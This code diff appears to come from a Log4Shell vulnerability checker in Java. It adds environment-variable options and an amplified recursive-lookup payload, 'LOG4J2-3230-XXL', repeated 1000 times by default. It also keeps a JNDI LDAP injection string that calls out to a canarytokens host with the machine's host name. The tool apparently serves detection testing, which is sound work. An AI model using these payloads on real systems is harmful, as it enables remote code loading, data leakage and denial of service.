@@ -8,6 +8,7 @@ import org.apache.logging.log4j.core.Core;
 import org.apache.logging.log4j.core.lookup.MapLookup;
 
 import java.util.LinkedHashMap;
+import java.util.Locale;
 import java.util.Map;
 
 public class Main implements Runnable {
@@ -36,10 +37,14 @@ public class Main implements Runnable {
             );
         }
 
-        final String canary = System.getProperty(
+        final String canary = getOption(
             "canary",
             "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}"
         );
+        final int repeat = Integer.parseInt(getOption(
+            "repeat",
+            1000
+        ));
         gadgets.put(
             "CVE-2021-44228",
             Log.log(canary)
@@ -51,6 +56,20 @@ public class Main implements Runnable {
         gadgets.put(
             "LOG4J2-3230",
             Log.printf("${${::-${::-$${::-j}}}}")
+        );
+        gadgets.put(
+            "LOG4J2-3230-XXL",
+            Log.printf("${" + "${::-".repeat(repeat) + "$${::-j}" + "}".repeat(repeat) + "}")
+        );
+    }
+
+    private static String getOption(String key, Object def) {
+        return System.getProperty(
+            key,
+            System.getenv().getOrDefault(
+                "LOG4SHELL_" + key.toUpperCase(Locale.US),
+                String.valueOf(def)
+            )
         );
     }
 
@@ -101,7 +120,7 @@ public class Main implements Runnable {
 
     public static void main(
         final String[] args
-    ) throws Exception {
+    ) {
         new Main(args).run();
     }
 }
